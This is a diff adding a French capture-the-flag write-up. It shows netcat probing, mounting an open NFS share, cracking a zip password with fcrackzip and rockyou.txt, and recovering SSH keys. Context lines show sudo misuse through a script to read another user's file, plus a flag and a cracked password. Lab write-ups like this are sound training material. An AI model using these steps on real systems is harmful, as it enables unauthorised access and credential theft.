@@ -307,3 +307,98 @@ EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}
     - 80 Site Web
   - Test du compte ftp anonymous, on constate qu'il y a un fichier **nomes.txt** il contient une phrase qui ne mène nulle part, c'est un rabbit hole.
   - Test du site web avec dirbuster, on trouve une route **discrete**, quand on se rend dessus on trouve un champ de texte dans lequel on peut taper des commandes shell mais pas toute. en tapant la commande `id` on voit que nous somme l'utilisateur **www-data**. Nous tapons ensuite la commande `sudo -l` et nous constatons que nous pouvons lancer le script musicbox dans le repertoire  **/home/six/**. Une fois le script lancé il affiche une phrase qui n'a pas réellement de sens **"note de musique", It entered, It didn't worked**. On décide donc d'afficher le contenu du script avec la commande `(cat /home/six/.musicbox)`. On se rend compte que le script attend une variable **$rep**. On saisit la commande `echo "ls -la /home/six/ | sudo -u /home/six/.musicbox` et on obtient le contenu du dossier six et que nous avons les droits de lecture sur le fichier user.txt, il suffit de saisir la commande `echo "cat /home/six/user.txt" | sudo -u six /home/six/.musicbox` pour obtenir le contenu et le token user.txt.
+
+## WriteUp The Binding Of Cyber
+Première information: le sujet, préconisant un scan à partir du port 109.
+Ainsi un simple netcan sur ce port nous informe sur la suite:
+```
+┌──(kali㉿kali)-[~]
+└─$ netcat 10.10.6.31 109
+I am lost, can you find me ? I'm usually on the top 100 ports  
+```
+
+Cette information nous pousse à scanner les 100 premiers.
+
+De la même manière, un netcat nous donne un indice: 
+
+```550 12345 ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄6⠄
+550 12345 ⠄⠄⠄⠄⠄⠄⠄⠄⠉⠙⠻⠿⠿⣿⣿⣿⣿⠿⠿⠛⠉⠄⠄⠄⠄⠄⠄⠄5⠄
+550 12345 ⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⠄⠄⠄⠄⠄⠄4⠄
+550 12345 ⠄⠄⠄⠄⠳⡀⠄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠌⠄⠄3⠄
+550 12345 ⠄⠄⠈⢿⡗⠄⠄⢸⣿⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⠄⠄⠄⠄⢸⡟⠄2⠄
+550 12345 ⠄⠄⢿⣿⡇⠄⠄⠄⣶⣿⣿⢁⣤⣤⣤⣤⣤⣤⠄⣿⣷⠄⠄⠄⠈⢹⣿⡟⠄⠄
+550 12345 ⠄⠸⣿⣇⠈⠉⠉⠄⠄⢀⣼⡿⠋⠄⠄⠄⠄⠙⢿⣄⠙⠛⠁⠄⠄⢠⣿⣿t⠄
+550 12345 ⠄⢠⣿⡏⢰⣿⣿⡇⠄⠄⢸⣿⣿⣿⠿⠿⣿⣿⣿⠁⣾⣿⣷⠄⠄⠘⣿⣿r⠄
+550 12345 ⠄⠄⣾⣿⡿⠟⡋⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠉⠉⠙⠻⣿⣿⣇o⠄
+550 12345 ⠄⠄⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠄p⠄
+550 12345 ⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠄⠄⠄⠄
+550 12345 ⠄⠄⠄⠄⠄⢀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠄⠄⠄⠄o⠄
+550 12345 ⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣄⣀⠄⠄⠄⠄⠄⠄⠄g⠄
+550 12345 ⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄
+```
+à droite on peut lire "go port 23456".
+
+```
+┌──(kali㉿kali)-[~]
+└─$ netcat 10.10.6.31 23456
+It remember ! I put the flags in my chest, it's on a nfs share, how do i list them ? 
+```
+
+Nous avons donc le premier véritable indice: NFS.
+Ainsi un scan NMAP devrait nous aider dans cette tache.
+
+###NFS
+Une commande "showmount" nous informera sur la localisation.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ showmount -e 10.10.6.31   
+Export list for 10.10.6.31:
+/home/nfs *
+```
+
+Après avoir créé un répertoire avon d'extraires les données, nous procédons au transfert:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo mount -t nfs 10.10.6.31:/home/nfs /mnt/nfs
+```
+On tombe sur un chest.zip, nécéssitant un mot de passe.
+
+```
+┌──(kali㉿kali)-[~]
+└─$ ls -la /mnt/nfs
+total 16
+drwxr-xr-x 2 nobody nogroup 4096 Dec  2 10:47 .
+drwxr-xr-x 3 root   root    4096 May 10 08:33 ..
+-rw-r--r-- 1 root   root    4817 Dec  2 10:47 chest.zip
+```
+
+un simple fcrackzip avec la liste rockyou.txt suffit à cracker le mot de passe:
+
+```
+┌──(kali㉿kali)-[~]
+└─$ fcrackzip -u -D -p /home/kali/Downloads/rockyou.txt  chest.zip 
+
+
+PASSWORD FOUND!!!!: pw == isaaciscrazy
+```
+
+Ansi le contenu du chest est le suivant:
+
+```
+┌──(kali㉿kali)-[~/chest/home/isaac/.ssh]
+└─$ ls -la
+total 28
+drwx------ 2 kali kali 4096 Dec  2 10:41 .
+drwxr-xr-x 3 kali kali 4096 Dec  2 10:45 ..
+-rw-r--r-- 1 kali kali  736 Dec  2 10:41 authorized_keys
+-rw-r--r-- 1 kali kali   28 Dec  2 10:41 flag.txt
+-rw-r--r-- 1 kali kali   10 Dec  2 10:41 hint.txt
+-rw------- 1 kali kali 3369 Dec  2 10:41 id_rsa
+-rw-r--r-- 1 kali kali  736 Dec  2 10:41 id_rsa.pub
+```
+On trouve donc le flag.txt
+
+
+
